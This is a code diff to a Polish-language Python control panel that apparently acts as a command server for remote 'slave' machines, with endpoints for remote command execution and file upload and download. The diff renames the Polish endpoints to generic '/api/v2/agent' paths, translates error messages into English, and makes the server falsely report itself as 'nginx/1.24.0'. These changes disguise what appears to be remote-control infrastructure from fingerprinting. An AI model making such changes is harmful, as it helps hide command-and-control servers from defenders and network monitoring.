@@ -52,16 +52,16 @@ def ep_strona(stan, zapyt):
     return 500, "text/plain; charset=utf-8", b"Brak pliku master_center.html obok master.py"
 
 
-@endpoint("/api/stan")
+@endpoint("/api/v2/overview")
 def ep_stan(stan, zapyt):
     try:
         since = int(zapyt.params.get("since", ["0"])[0])
     except ValueError:
-        return odpowiedz_json({"blad": "since"}, 400)
+        return odpowiedz_json({"error": "since"}, 400)
     return odpowiedz_json(snapshot(stan, since))
 
 
-@endpoint("/api/meta")
+@endpoint("/api/v2/meta")
 def ep_meta(stan, zapyt):
     """Stałe dane dla panelu: polecenia, makra, token rejestracji i publiczny port Slaves."""
     macros = sorted(p.stem for p in MACRO_DIR.glob("*.sh") if p.is_file())
@@ -76,7 +76,7 @@ def ep_meta(stan, zapyt):
     })
 
 
-@endpoint("/api/slaves")
+@endpoint("/api/v2/agents")
 def ep_slaves(stan, zapyt):
     with stan.lock:
         slaves = sorted(
@@ -86,17 +86,17 @@ def ep_slaves(stan, zapyt):
     return odpowiedz_json({"slaves": slaves})
 
 
-@endpoint("/api/slave/", prefix=True)
+@endpoint("/api/v2/agent/", prefix=True)
 def ep_slave(stan, zapyt):
     try:
         with stan.lock:
             slave_id = znajdz_slaves(stan, urllib.parse.unquote(zapyt.sciezka.rsplit("/", 1)[1]))
     except ValueError as e:
-        return odpowiedz_json({"blad": str(e)}, 404)
+        return odpowiedz_json({"error": str(e)}, 404)
     return odpowiedz_json(historia_slaves(stan, slave_id))
 
 
-@endpoint("/api/slave/polacz", metoda="POST")
+@endpoint("/api/v2/agent/resume", metoda="POST")
 def ep_slave_polacz(stan, zapyt):
     """Otwiera sesję wybranego Slave'a (czekamy aż przyjdzie z pollingiem)."""
     dane = zapyt.dane or {}
@@ -109,7 +109,7 @@ def ep_slave_polacz(stan, zapyt):
     return odpowiedz_json({"ok": True, "id": slave_id})
 
 
-@endpoint("/api/slave/rozlacz", metoda="POST")
+@endpoint("/api/v2/agent/disconnect", metoda="POST")
 def ep_slave_rozlacz(stan, zapyt):
     """Zamyka sesję wybranego Slave'a — kolejne pakiety dostaną 503."""
     dane = zapyt.dane or {}
@@ -122,7 +122,7 @@ def ep_slave_rozlacz(stan, zapyt):
     return odpowiedz_json({"ok": True, "id": slave_id})
 
 
-@endpoint("/api/polecenie", metoda="POST")
+@endpoint("/api/v2/agent/action", metoda="POST")
 def ep_polecenie(stan, zapyt):
     """{"cel": ID | nazwa, "polecenie": "pauza", "args": [...]}"""
     dane = zapyt.dane or {}
@@ -159,26 +159,26 @@ def parsuj_komende_terminalowa(tekst):
 
 # ─── transfer plików: slave ↔ operator ──────────────────────────────────────
 
-@endpoint("/api/slave/wyslij", metoda="POST", strumien=True)
+@endpoint("/api/v2/agent/upload", metoda="POST", strumien=True)
 def ep_slave_wyslij(stan, zapyt):
     """Operator wgrywa plik na Mastera. Query: ?id=<slave>&zdalny=<ścieżka_na_slave>.
     Body = surowe bajty (Content-Length wymagany). Master kolejkuje polecenie `pobierz` do slave'a."""
     slave_id = (zapyt.params.get("id", [""])[0] or "").strip()
     zdalny = (zapyt.params.get("zdalny", [""])[0] or "").strip()
     if not slave_id:
-        return 400, "application/json", json.dumps({"blad": "Podaj id slave'a."}).encode()
+        return 400, "application/json", json.dumps({"error": "missing id"}).encode()
     if not zdalny:
-        return 400, "application/json", json.dumps({"blad": "Podaj ścieżkę docelową."}).encode()
+        return 400, "application/json", json.dumps({"error": "missing path"}).encode()
     if zapyt.content_length <= 0:
-        return 411, "application/json", json.dumps({"blad": "Wymagany Content-Length."}).encode()
+        return 411, "application/json", json.dumps({"error": "content-length required"}).encode()
     if zapyt.content_length > PLIKI_MAX_B:
         return 413, "application/json", json.dumps(
-            {"blad": f"Plik większy niż limit {PLIKI_MAX_B} B."}).encode()
+            {"error": f"payload too large ({PLIKI_MAX_B} B limit)"}).encode()
     try:
         with stan.lock:
             slave_id = znajdz_slaves(stan, slave_id)
     except ValueError as e:
-        return 404, "application/json", json.dumps({"blad": str(e)}).encode()
+        return 404, "application/json", json.dumps({"error": str(e)}).encode()
 
     hasher = hashlib.sha256()
     buf = bytearray()
@@ -189,7 +189,7 @@ def ep_slave_wyslij(stan, zapyt):
             break
         buf.extend(chunk); hasher.update(chunk); pozostalo -= len(chunk)
     if len(buf) != zapyt.content_length:
-        return 400, "application/json", json.dumps({"blad": "niekompletne body"}).encode()
+        return 400, "application/json", json.dumps({"error": "incomplete body"}).encode()
 
     sha = hasher.hexdigest()
     p = wydaj_polecenie(stan, slave_id, "pobierz", [zdalny, sha, str(len(buf))])
@@ -203,7 +203,7 @@ def ep_slave_wyslij(stan, zapyt):
          "cel": zdalny, "slave": slave_id}).encode()
 
 
-@endpoint("/api/slave/pobierz", metoda="GET", strumien=True)
+@endpoint("/api/v2/agent/download", metoda="GET", strumien=True)
 def ep_slave_pobierz(stan, zapyt):
     """Operator pobiera plik ze slave'a. Query: ?id=<slave>&zdalny=<ścieżka>&nazwa=<nazwa_pliku>&timeout=<s>.
     Master kolejkuje polecenie `wyslij <zdalny>` do slave'a i czeka aż pliki_od_slave się napełni."""
@@ -216,7 +216,7 @@ def ep_slave_pobierz(stan, zapyt):
         timeout = 120.0
 
     def blad_json(kod, msg):
-        tresc = json.dumps({"blad": msg}).encode()
+        tresc = json.dumps({"error": msg}).encode()
         reason = {400: "Bad Request", 404: "Not Found", 500: "Internal Server Error",
                   504: "Gateway Timeout"}.get(kod, "Error")
         try:
@@ -269,7 +269,7 @@ def ep_slave_pobierz(stan, zapyt):
     return None
 
 
-@endpoint("/api/terminal", metoda="POST")
+@endpoint("/api/v2/agent/exec", metoda="POST")
 def ep_terminal(stan, zapyt):
     dane = zapyt.dane or {}
     cel = str(dane.get("cel", "")).strip()
@@ -326,6 +326,9 @@ class SerwerPanelu(ThreadingHTTPServer):
 class Panel(BaseHTTPRequestHandler):
     """Klej HTTP: szuka funkcji w rejestrze ENDPOINTY i wywołuje ją."""
 
+    server_version = "nginx/1.24.0"
+    sys_version = ""
+
     def log_message(self, *a):
         pass
 
@@ -361,9 +364,9 @@ class Panel(BaseHTTPRequestHandler):
                     dane = self._wczytaj_json() if metoda == "POST" else None
                     kod, typ, tresc = funkcja(stan, Zapytanie(sciezka, params, dane, self.headers))
             except ValueError as e:
-                kod, typ, tresc = odpowiedz_json({"blad": str(e)}, 400)
+                kod, typ, tresc = odpowiedz_json({"error": str(e)}, 400)
             except Exception as e:
-                kod, typ, tresc = 500, "text/plain; charset=utf-8", f"blad: {e}".encode()
+                kod, typ, tresc = 500, "text/plain; charset=utf-8", f"error: {e}".encode()
         if wynik_wlasna_odp:
             return
         try:
